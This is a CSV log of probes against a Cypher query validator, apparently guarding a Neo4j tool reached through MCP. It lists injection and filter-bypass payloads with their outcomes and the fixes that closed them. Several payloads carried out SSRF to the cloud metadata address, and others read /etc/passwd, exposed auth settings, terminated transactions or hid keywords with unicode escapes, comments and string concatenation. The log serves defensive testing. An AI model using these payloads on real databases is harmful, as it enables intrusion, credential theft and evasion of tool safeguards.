Technique,Cypher,Result,Blocked_By,Notes
CALL db.index.vector.createNodeIndex (SCHEMA proc),"CALL db.index.vector.createNodeIndex('idx', 'TestNode', 'embedding', 128, 'cosine')",BLOCKED,EXPLAIN write check,EXPLAIN knows proc is SCHEMA mode
CALL dbms.listConfig (DBMS proc),"CALL dbms.listConfig() YIELD name, value WHERE name CONTAINS 'password' RETURN name, value",BLOCKED,EXPLAIN write check,EXPLAIN treats DBMS mode as non-read
CALL tx.setMetaData (DBMS proc),"CALL tx.setMetaData({role: 'admin', bypass: true}) RETURN 1",BLOCKED,EXPLAIN write check,EXPLAIN treats DBMS mode as non-read
CALL dbms.killConnections (DBMS proc),"CALL dbms.killConnections(['conn-0']) YIELD connectionId RETURN connectionId",BLOCKED,EXPLAIN write check,EXPLAIN treats DBMS mode as non-read
CALL dbms.queryJmx (DBMS proc),"CALL dbms.queryJmx('org.neo4j:*') YIELD name, attributes RETURN name, attributes LIMIT 5",BLOCKED,EXPLAIN write check,EXPLAIN treats DBMS mode as non-read
CALL dbms.components (DBMS proc),"CALL dbms.components() YIELD name, versions, edition RETURN name, versions, edition",BLOCKED,EXPLAIN write check,EXPLAIN treats DBMS mode as non-read
CALL dbms.security.createUser (missing proc),"CALL dbms.security.createUser('hacker', 'password', false)",BLOCKED,EXPLAIN exception,Procedure not found; exception caught before SSRF regex
CALL apoc.cypher.doIt (APOC write — not installed),"CALL apoc.cypher.doIt(""CREATE (n) RETURN n"", {}) YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; exception caught before execution
CALL apoc.cypher.run (APOC write — not installed),"CALL apoc.cypher.run(""CREATE (n) RETURN n"", {}) YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; exception caught before execution
CALL apoc.do.when (APOC write — not installed),"CALL apoc.do.when(true, ""CREATE (n) RETURN n"", ""RETURN 1"", {}) YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; exception caught before execution
LOAD CSV file SSRF,"LOAD CSV FROM 'file:///etc/passwd' AS line RETURN line LIMIT 5",BLOCKED,SSRF regex or EXPLAIN,Cannot distinguish from error message alone
LOAD CSV http SSRF,"LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",BLOCKED,SSRF regex or EXPLAIN,Cannot distinguish from error message alone
LOAD CSV https,"LOAD CSV FROM 'https://example.com/test.csv' AS line RETURN line LIMIT 1",BLOCKED,SSRF regex or EXPLAIN,Cannot distinguish from error message alone
LOAD CSV data URI,"LOAD CSV FROM 'data:text/plain,a,b,c' AS line RETURN line",BLOCKED,SSRF regex or EXPLAIN,Cannot distinguish from error message alone
apoc.load.json SSRF (not installed),"CALL apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; SSRF regex never reached
apoc.load.json private IP (not installed),"CALL apoc.load.json('http://10.0.0.1/secret') YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; SSRF regex never reached
apoc.load.json FTP (not installed),"CALL apoc.load.json('ftp://internal-server/data') YIELD value RETURN value",BLOCKED,EXPLAIN exception,Procedure not found; SSRF regex never reached
APOC function (not installed),"RETURN apoc.text.base64Decode('c2VjcmV0') AS decoded",BLOCKED,EXPLAIN exception,APOC functions not installed
GDS procedure (not installed),"CALL gds.graph.list() YIELD graphName RETURN graphName LIMIT 1",BLOCKED,EXPLAIN exception,GDS not installed
SSRF regex comment bypass — CALL apoc,"CALL /* bypass */ apoc.load.json('http://169.254.254.254/latest/meta-data/') YIELD value RETURN value",REGEX BYPASSED (blocked only by missing proc),EXPLAIN exception (APOC not installed),"\bCALL\s+apoc\. does not match with comment between CALL and apoc; confirmed exploitable if APOC installed; FIXED by stripping comments before regex"
LOAD CSV comment bypass — CONFIRMED SSRF EXECUTION,"LOAD /* bypass */ CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",EXECUTED — Neo4j made HTTP request,Nothing (both checks bypassed),"LOAD /* */ CSV bypasses \bLOAD\s+CSV\b; EXPLAIN returns query_type='r'; Neo4j attempted fetch — failed only because no metadata server in dev. FIXED by stripping comments before regex"
Non-APOC custom HTTP procedure (hypothetical),"CALL gds.someHttpProc('http://internal/') YIELD value RETURN value",N/A (structural gap),Nothing,SSRF regex only covers apoc. namespace and LOAD CSV; any other installed proc making network calls bypasses both checks
Embedded CALL apoc mid-query (after MATCH),"MATCH (n) CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN n, value LIMIT 1",BLOCKED,EXPLAIN exception (APOC not installed),re.search() finds CALL apoc. anywhere in string; would be caught by regex if APOC were installed
Embedded CALL apoc after WITH,"WITH 'http://169.254.169.254/' AS url CALL apoc.load.json(url) YIELD value RETURN value",BLOCKED,EXPLAIN exception (APOC not installed),Same — re.search() catches CALL apoc. regardless of position
Embedded CALL apoc in subquery,"CALL { MATCH (n) CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value } RETURN value",BLOCKED,EXPLAIN exception (APOC not installed),Nested CALL apoc. still matched by re.search()
Embedded CALL apoc via UNWIND,"UNWIND ['http://169.254.169.254/'] AS url CALL apoc.load.json(url) YIELD value WITH value RETURN value",BLOCKED,EXPLAIN exception (APOC not installed),Parameterized URL in variable does not help — CALL apoc. still in query string
CALL apoc inside inner subquery with WITH,"MATCH (n) WITH n CALL { WITH n CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value } RETURN value LIMIT 1",BLOCKED,EXPLAIN exception (APOC not installed),Deeply nested CALL apoc. still caught by re.search()
APOC as function form (no CALL keyword),"RETURN apoc.load.json('http://169.254.169.254/latest/meta-data/') AS data",BLOCKED,EXPLAIN exception (unknown function),apoc.load.json is a procedure not a function; would fail even with APOC installed; no CALL in string so regex gap exists but not exploitable
APOC utility function form,"RETURN apoc.util.get('http://169.254.169.254/', {}, null, {}) AS data",BLOCKED,EXPLAIN exception (unknown function),Same — function form; no CALL keyword so regex would not catch; not exploitable as APOC I/O is procedure-only
LOAD CSV comment bypass (post-fix — container not restarted),"LOAD /* x */ CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",STILL EXECUTED (fix on disk not deployed),Nothing (container not restarted),Confirmed second SSRF execution; fix requires container restart to take effect
CALL apoc comment bypass (post-fix — container not restarted),"CALL /* x */ apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value",BLOCKED,EXPLAIN exception (APOC not installed),Fix correctness cannot be verified live without APOC installed; unit tests confirm fix
[APOC INSTALLED] CALL apoc.load.json direct,"CALL apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value",BLOCKED,SSRF regex (\bCALL\s+apoc\.),Fix 1 deployed; regex correctly fires with APOC present
[APOC INSTALLED] CALL /* bypass */ apoc.load.json,"CALL /* bypass */ apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value",BLOCKED,SSRF regex (comment stripped),Fix 1 deployed; comment stripped before regex check
[APOC INSTALLED] LOAD /* bypass */ CSV,"LOAD /* bypass */ CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",BLOCKED,SSRF regex (comment stripped),Fix 1 verified working with APOC installed
[APOC INSTALLED] CALL // line-comment newline apoc.,"CALL // line comment\napoc.load.json('http://169.254.169.254/') YIELD value RETURN value",BLOCKED,SSRF regex (line comment stripped),// comment stripped; \bCALL\s+apoc\. matches
[APOC INSTALLED] CALL apoc.cypher.run write,"CALL apoc.cypher.run('CREATE (n:Pwned) RETURN n', {}) YIELD value RETURN value",BLOCKED,SSRF regex (\bCALL\s+apoc\.),CALL apoc. in query; caught before execution
[APOC INSTALLED] CALL apoc.cypher.doIt write,"CALL apoc.cypher.doIt('MATCH (n) SET n.pwned = true RETURN count(n)', {}) YIELD value RETURN value",BLOCKED,SSRF regex (\bCALL\s+apoc\.),Same
[APOC INSTALLED] apoc.text.base64Encode (safe function),"RETURN apoc.text.base64Encode('secret_data') AS encoded",ALLOWED,—,APOC pure-computation functions are unrestricted; not an SSRF vector
[APOC INSTALLED] apoc.convert.toJson (safe function),"MATCH (n) RETURN apoc.convert.toJson(properties(n)) AS json LIMIT 1",ALLOWED,—,Same — APOC functions with no I/O pass freely
[APOC INSTALLED] apoc.cypher.runFirstColumnMany (no CALL — EXECUTED),"RETURN apoc.cypher.runFirstColumnMany('MATCH (x) RETURN x', {}) AS r",EXECUTED — returned all nodes,Nothing (Fix 2 not yet deployed),"APOC function (no CALL keyword); not in regex; executed full table scan. FIXED by \bapoc\.cypher\."
[APOC INSTALLED] apoc.cypher.runFirstColumnSingle (no CALL — EXECUTED),"RETURN apoc.cypher.runFirstColumnSingle('MATCH (n) RETURN n.id LIMIT 1', {}) AS r",EXECUTED — returned node id,Nothing (Fix 2 not yet deployed),Same — arbitrary inner Cypher executed without validator restrictions
[APOC INSTALLED] apoc.cypher.runFirstColumnMany with CREATE (inner write),"RETURN apoc.cypher.runFirstColumnMany('CREATE (n:Pwned {ts: timestamp()}) RETURN n.ts', {}) AS r",FAILED TO EXECUTE (tool error),APOC function READ-mode enforcement,APOC functions run in READ mode; inner CREATE rejected by Neo4j; not a write bypass
[APOC INSTALLED] apoc.cypher.runFirstColumnSingle with DETACH DELETE (inner write),"RETURN apoc.cypher.runFirstColumnSingle('MATCH (n) DETACH DELETE n RETURN count(*)', {}) AS r",FAILED TO EXECUTE (tool error),APOC function READ-mode enforcement,Same — inner write blocked by Neo4j read-mode for functions
[APOC INSTALLED] apoc.cypher.runFirstColumnSingle SHOW PROCEDURES (inner DBMS),"RETURN apoc.cypher.runFirstColumnSingle('SHOW PROCEDURES YIELD name mode WHERE mode = ''WRITE'' RETURN name LIMIT 5', {}) AS r",EXECUTED — returned procedure list,Nothing,Inner DBMS query executed via function; bypasses outer EXPLAIN check
[APOC INSTALLED] SSRF via apoc.cypher — CALL apoc in inner string,"RETURN apoc.cypher.runFirstColumnSingle('CALL apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value', {}) AS r",BLOCKED,SSRF regex (\bCALL\s+apoc\. in string before //),"CALL apoc.load.json appears before // in URL; comment stripping leaves it intact; regex catches it"
[APOC INSTALLED] SSRF via apoc.cypher — string concat splits CALL apoc. — CONFIRMED SSRF,"WITH 'CALL ' + 'apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value' AS q RETURN apoc.cypher.runFirstColumnSingle(q {}) AS data",EXECUTED — Neo4j made HTTP request,Nothing (Fix 2+3 not yet deployed),"String concat splits CALL and apoc. across two literals; // hides apoc.cypher. from stripped check. FIXED by \bapoc\.cypher\. + dual original/stripped check"
[APOC INSTALLED] Backtick-quoted procedure name,"CALL `apoc.load.json`('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value",REGEX BYPASSED (blocked by Neo4j),Neo4j proc-not-found,Backtick-quoted name has no apoc. preceded by whitespace so \bCALL\s+apoc\. misses; Neo4j does not resolve backtick-quoted procedure names
[APOC INSTALLED] ZWS between CALL and identifier,"CALL [U+200B]apoc.load.json('http://169.254.169.254/') YIELD value RETURN value",REGEX BYPASSED (blocked by Neo4j parse error),Neo4j syntax error,ZWS is invalid in identifier start position; not exploitable
[APOC INSTALLED] ZWS within apoc identifier,"CALL ap[U+200B]oc.load.json('http://169.254.169.254/') YIELD value RETURN value",REGEX BYPASSED (blocked by proc-not-found),Neo4j preserves ZWS in name,Neo4j includes ZWS in procedure name so lookup fails; not exploitable
[APOC INSTALLED] ZWS within apoc.cypher namespace,"RETURN apoc.cypher[U+200B].runFirstColumnSingle('MATCH (n) RETURN n.id LIMIT 1' {}) AS r",REGEX BYPASSED (blocked by func-not-found),Neo4j preserves ZWS in name,Same pattern — function name includes ZWS; not exploitable
[APOC INSTALLED] ZWS between apoc and dot,"CALL apoc[U+200B].load.json('http://169.254.169.254/') YIELD value RETURN value",REGEX BYPASSED (blocked by proc-not-found),Neo4j preserves ZWS in name,\bCALL\s+apoc\. requires dot immediately after apoc; ZWS breaks match; not exploitable
[APOC INSTALLED] Cyrillic homoglyph in apoc,"CALL [Cyr-а]poc.load.json('http://169.254.169.254/') YIELD value RETURN value",REGEX BYPASSED (blocked by proc-not-found),Neo4j preserves homoglyph in name,Cyrillic а (U+0430) looks like a but Neo4j preserves it; not exploitable
[APOC INSTALLED] BOM at query start,"[U+FEFF]CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value",REGEX BYPASSED (blocked by Neo4j parse error),Neo4j syntax error,BOM at start of query is invalid Cypher
[APOC INSTALLED] Non-breaking space between CALL and apoc,"CALL [U+00A0]apoc.load.json('http://169.254.169.254/') YIELD value RETURN value",BLOCKED,EXPLAIN write check or SSRF regex,Python \s matches U+00A0; no bypass
[APOC INSTALLED] LALL (misspelled CALL) to bypass regex,"RETURN apoc.cypher.runFirstColumnSingle('LALL apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value' {}) AS r",FAILED TO EXECUTE (tool error),APOC inner query syntax error,LALL is not valid Cypher; regex bypassed but inner query fails
[APOC INSTALLED] Dynamic SSRF via toUpper('call') — CONFIRMED SSRF,"RETURN apoc.cypher.runFirstColumnSingle(toUpper('call') + ' apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value' {}) AS r",EXECUTED — Neo4j made HTTP request,Nothing (Fix 2 not yet deployed),"No literal CALL in outer query; toUpper constructs it at runtime. FIXED by \bapoc\.cypher\."
[APOC INSTALLED] Dynamic SSRF via string split ('CALL apoc' + '.load.json') — CONFIRMED SSRF,"RETURN apoc.cypher.runFirstColumnSingle('CALL apoc' + '.load.json(""http://169.254.169.254/"") YIELD value RETURN value' {}) AS r",EXECUTED — Neo4j made HTTP request,Nothing (Fix 2 not yet deployed),"Splits CALL apoc. across literals; \bCALL\s+apoc\. requires contiguous match. FIXED by \bapoc\.cypher\."
[APOC INSTALLED] Dynamic SSRF via char-array join — CONFIRMED SSRF,"WITH ['C','A','L','L',' ','a','p','o','c','.','l','o','a','d','.','j','s','o','n'] AS c RETURN apoc.cypher.runFirstColumnSingle(apoc.text.join(c '') {}) AS r",EXECUTED — Neo4j made HTTP request,Nothing (Fix 2 not yet deployed),"No recognisable keyword fragment in query. FIXED by \bapoc\.cypher\."
[POST-FIX] LOAD /* bypass */ CSV (Fix 1+2+3 deployed),"LOAD /* bypass */ CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line",BLOCKED,SSRF regex (comment stripped),All fixes verified after container restart
[POST-FIX] apoc.cypher.runFirstColumnSingle (Fix 2 deployed),"RETURN apoc.cypher.runFirstColumnSingle('MATCH (n) RETURN n.id LIMIT 1' {}) AS r",BLOCKED,SSRF regex (\bapoc\.cypher\.),Fix 2 verified
[POST-FIX] String concat SSRF (Fix 2+3 deployed),"WITH 'CALL ' + 'apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value' AS q RETURN apoc.cypher.runFirstColumnSingle(q {}) AS data",BLOCKED,SSRF regex (\bapoc\.cypher\.),Fix 2+3 verified
[POST-FIX] toUpper SSRF (Fix 2 deployed),"RETURN apoc.cypher.runFirstColumnSingle(toUpper('call') + ' apoc.load.json(""http://169.254.169.254/"") YIELD value RETURN value' {}) AS r",BLOCKED,SSRF regex (\bapoc\.cypher\.),Fix 2 verified
[POST-FIX] String split SSRF (Fix 2 deployed),"RETURN apoc.cypher.runFirstColumnSingle('CALL apoc' + '.load.json(""http://169.254.169.254/"") YIELD value RETURN value' {}) AS r",BLOCKED,SSRF regex (\bapoc\.cypher\.),Fix 2 verified
[POST-FIX] Char-array SSRF (Fix 2 deployed),"WITH ['C','A','L','L',' ','a','p','o','c','.','l','o','a','d','.','j','s','o','n'] AS c RETURN apoc.cypher.runFirstColumnSingle(apoc.text.join(c '') {}) AS r",BLOCKED,SSRF regex (\bapoc\.cypher\.),Fix 2 verified
SHOW PROCEDURES admin metadata,"SHOW PROCEDURES YIELD name, mode WHERE mode IN ['WRITE', 'DBMS', 'SCHEMA'] RETURN name, mode ORDER BY mode, name LIMIT 10",ALLOWED,Nothing,Direct SHOW PROCEDURES exposes DBMS/WRITE/SCHEMA procedure names even though CALL dbms.* procedure execution is blocked
SHOW SETTINGS sensitive config,"SHOW SETTINGS YIELD name, value WHERE name CONTAINS 'auth' OR name CONTAINS 'password' RETURN name, value ORDER BY name LIMIT 10",ALLOWED,Nothing,Direct SHOW SETTINGS exposes configuration metadata such as auth settings
SHOW USERS,"SHOW USERS YIELD user, roles, passwordChangeRequired, suspended RETURN user, roles, passwordChangeRequired, suspended",BLOCKED,EXPLAIN write check,Neo4j classifies this administration command as non-read
SHOW ROLES,"SHOW ROLES YIELD role RETURN role ORDER BY role",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command in this context
SHOW PRIVILEGES,"SHOW PRIVILEGES YIELD access, action, resource RETURN access, action, resource LIMIT 10",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command in this context
SHOW TRANSACTIONS query introspection,"SHOW TRANSACTIONS YIELD transactionId, currentQuery, username RETURN transactionId, currentQuery, username LIMIT 5",ALLOWED,Nothing,Direct SHOW TRANSACTIONS exposes active query text and transaction ids
SHOW DATABASES,"SHOW DATABASES YIELD name, currentStatus, address, role, requestedStatus RETURN name, currentStatus, address, role, requestedStatus",BLOCKED,EXPLAIN write check,Neo4j classifies this administration command as non-read
SHOW FUNCTIONS metadata,"SHOW FUNCTIONS YIELD name, category RETURN name, category ORDER BY name LIMIT 10",ALLOWED,Nothing,Function catalog is exposed; may be acceptable metadata but reveals available APOC functions
TERMINATE TRANSACTIONS side effect,"TERMINATE TRANSACTIONS 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message",EXECUTED,Nothing,Nonexistent transaction id returned Transaction not found; command path executed and could terminate a real transaction id discovered via SHOW TRANSACTIONS
STOP DATABASE nonexistent,"STOP DATABASE definitely_not_a_real_database_name",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command before execution
START DATABASE nonexistent,"START DATABASE definitely_not_a_real_database_name",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command before execution
APOC periodic write job,"CALL apoc.periodic.submit('seizu_write_probe', 'CREATE (:Pwned {source: ""periodic""})') YIELD name RETURN name",BLOCKED,SSRF regex or EXPLAIN,CALL apoc.* is blocked before a background write job can be scheduled
APOC trigger write,"CALL apoc.trigger.add('seizu_probe', 'CREATE (:Pwned {source: ""trigger""})', {phase: 'after'}) YIELD name RETURN name",BLOCKED,SSRF regex or EXPLAIN,CALL apoc.* is blocked before a trigger can be installed
POST-FIX apoc.cypher admin command,"RETURN apoc.cypher.runFirstColumnSingle('SHOW SETTINGS YIELD name RETURN count(*)', {}) AS count",BLOCKED,SSRF regex (\bapoc\.cypher\.),apoc.cypher dynamic command execution remains blocked after Fix 2
SHOW INDEXES metadata,"SHOW INDEXES YIELD name, type, entityType, labelsOrTypes, properties RETURN name, type, entityType, labelsOrTypes, properties LIMIT 10",ALLOWED,Nothing,Schema metadata is exposed; likely acceptable for schema browsing but recorded for completeness
CALL dbms.setConfigValue,"CALL dbms.setConfigValue('db.logs.query.enabled', 'OFF') YIELD name, value RETURN name, value",BLOCKED,EXPLAIN exception,Procedure not found; no config mutation executed
CALL dbms.listConnections,"CALL dbms.listConnections() YIELD connectionId, connectTime, username RETURN connectionId, connectTime, username LIMIT 5",BLOCKED,EXPLAIN write check,Direct DBMS procedure form remains blocked
SHOW CONNECTIONS,"SHOW CONNECTIONS YIELD connectionId, connectTime, username RETURN connectionId, connectTime, username LIMIT 5",BLOCKED,EXPLAIN syntax error,SHOW CONNECTIONS is not valid in this Neo4j version
SHOW SERVERS,"SHOW SERVERS YIELD name, address, state, health RETURN name, address, state, health",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command in this context
SHOW CURRENT USER,"SHOW CURRENT USER YIELD user, roles RETURN user, roles",BLOCKED,EXPLAIN write check,Neo4j classifies this administration command as non-read
SHOW SUPPORTED PRIVILEGES,"SHOW SUPPORTED PRIVILEGES YIELD * RETURN * LIMIT 10",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command in this context
SHOW ALIASES FOR DATABASE,"SHOW ALIASES FOR DATABASE YIELD name, database, location, url RETURN name, database, location, url",BLOCKED,EXPLAIN exception,Neo4j reports unsupported administration command in this context
TERMINATE TRANSACTION singular side effect,"TERMINATE TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message",EXECUTED,Nothing,Singular form also executes; nonexistent id avoids killing a real transaction
TERMINATE inside subquery,"CALL { TERMINATE TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message } RETURN transactionId, message",BLOCKED,EXPLAIN syntax error,Administration command is not accepted inside a CALL subquery
USE system SHOW SETTINGS,"USE system SHOW SETTINGS YIELD name, value RETURN name, value LIMIT 5",BLOCKED,EXPLAIN write check,Switching to system database before SHOW SETTINGS is blocked
Unicode quote read breakout,"MATCH (n) WHERE n.name = 'Robby\u0027 OR 1=1 RETURN count(n) AS total //' RETURN n LIMIT 1",EXECUTED — returned node count,Nothing,"Neo4j resolves \u0027 to a string delimiter; read-only information disclosure payload executes but is not a write/admin bypass"
Unicode quote write breakout,"MATCH (n) WHERE n.name = 'Robby\u0027 WITH true AS ignored CREATE (:SeizuFuzzProbe {source:'unicode_quote_write'}) //' RETURN n LIMIT 1",BLOCKED,EXPLAIN write check,"Neo4j sees the decoded CREATE and classifies the query as write"
Unicode SHOW keyword bypass,"SH\u004fW SETTINGS YIELD name, value RETURN name, value LIMIT 1",EXECUTED — returned setting,Nothing (pre unicode-normalization fix),"Neo4j resolves \u004f inside the SHOW keyword; raw admin regex missed it. FIXED by decoding Cypher unicode escapes before scanning"
Unicode SHOW whitespace bypass,"SHOW\u0020SETTINGS YIELD name, value RETURN name, value LIMIT 1",EXECUTED — returned setting,Nothing (pre unicode-normalization fix),"Neo4j resolves \u0020 to whitespace between SHOW and SETTINGS. FIXED by decoding Cypher unicode escapes before scanning"
Unicode TERMINATE keyword bypass,"TERM\u0049NATE TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message",EXECUTED,Nothing (pre unicode-normalization fix),"Nonexistent transaction id returned Transaction not found; command path executed. FIXED by decoding Cypher unicode escapes before scanning"
Unicode LOAD keyword bypass,"LO\u0041D CSV FROM 'data:text/plain,a,b' AS row RETURN row",FAILED TO EXECUTE (tool error),Nothing (pre unicode-normalization fix),"Raw LOAD CSV regex missed unicode keyword; validator allowed execution attempt. FIXED by decoding Cypher unicode escapes before scanning"
Unicode LOAD whitespace bypass,"LOAD\u0020CSV FROM 'data:text/plain,a,b' AS row RETURN row",FAILED TO EXECUTE (tool error),Nothing (pre unicode-normalization fix),"Raw LOAD CSV regex missed unicode whitespace. FIXED by decoding Cypher unicode escapes before scanning"
Unicode CALL apoc keyword bypass,"C\u0041LL apoc.help('text') YIELD name RETURN name LIMIT 5",EXECUTED — returned APOC help rows,Nothing (pre unicode-normalization fix),"Neo4j resolves unicode inside CALL; raw CALL apoc regex missed it. FIXED by decoding Cypher unicode escapes before scanning"
Unicode CALL apoc whitespace bypass,"CALL\u0020apoc.help('text') YIELD name RETURN name LIMIT 1",EXECUTED — returned APOC help row,Nothing (pre unicode-normalization fix),"Neo4j resolves unicode whitespace between CALL and apoc. FIXED by decoding Cypher unicode escapes before scanning"
Unicode CALL apoc SSRF bypass,"C\u0041LL apoc.load.json('http://127.0.0.1:1/') YIELD value RETURN value",FAILED TO EXECUTE (tool error),Nothing (pre unicode-normalization fix),"Raw CALL apoc regex missed unicode CALL and Neo4j attempted the APOC load path; localhost:1 failed. FIXED by decoding Cypher unicode escapes before scanning"
Unicode apoc.cypher namespace bypass,"RETURN apoc.cyph\u0065r.runFirstColumnSingle('SHOW SETTINGS YIELD name RETURN count(*)', {}) AS count",EXECUTED — returned settings count,Nothing (pre unicode-normalization fix),"Raw apoc.cypher regex missed unicode namespace and dynamic inner Cypher executed. FIXED by decoding Cypher unicode escapes before scanning"
Nested unicode escape keyword attempt,"SH\u005C\u0075004fW SETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,EXPLAIN syntax error,"Neo4j did not recursively decode \u005C\u0075004f into \u004f; parser saw invalid SH..."
[POST-FIX] Unicode SHOW keyword bypass,"SH\u004fW SETTINGS YIELD name, value RETURN name, value LIMIT 1",BLOCKED,Unicode-normalized admin regex,Fix verified through MCP after service restart
[POST-FIX] Unicode TERMINATE keyword bypass,"TERM\u0049NATE TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message",BLOCKED,Unicode-normalized admin regex,Fix verified through MCP after service restart
[POST-FIX] Unicode CALL apoc SSRF bypass,"C\u0041LL apoc.load.json('http://127.0.0.1:1/') YIELD value RETURN value",BLOCKED,Unicode-normalized SSRF regex,Fix verified through MCP after service restart
